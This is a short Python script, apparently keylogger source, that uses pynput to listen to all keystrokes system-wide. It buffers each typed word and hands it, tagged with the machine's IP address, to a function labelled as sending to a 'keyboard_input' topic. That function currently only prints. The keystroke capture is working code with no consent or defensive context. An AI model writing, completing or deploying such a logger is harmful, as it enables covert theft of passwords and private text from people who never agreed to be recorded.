from pynput.keyboard import Key, Listener
import socket

currentString = ''


def append_string(character):
    global currentString
    currentString += character


def delete_last_character():
    global currentString
    new_string = ''
    for i in range(0, len(currentString) - 1):
        new_string += currentString[i]
    currentString = new_string


def get_ip_address():
    return socket.gethostbyname(socket.gethostname())


def prepare_body(ip_address, message):
    return {'ip_address': ip_address, 'message': message}


def clear_string():
    global currentString
    currentString = ''


def add_to_topic(topic, message):
    topic_message = prepare_body(get_ip_address(), message)
    print('Sent {} to topic {}'.format(topic_message, topic))


def on_press(key):
    global currentString
    if is_whitespace(key):
        add_to_topic('keyboard_input', currentString)
        clear_string()
    elif key is Key.backspace:
        delete_last_character()
    else:
        append_string(str(key)[1])


def is_whitespace(key):
    return key in [Key.enter, Key.space, Key.tab]


with Listener(on_press=on_press) as listener:
    listener.join()
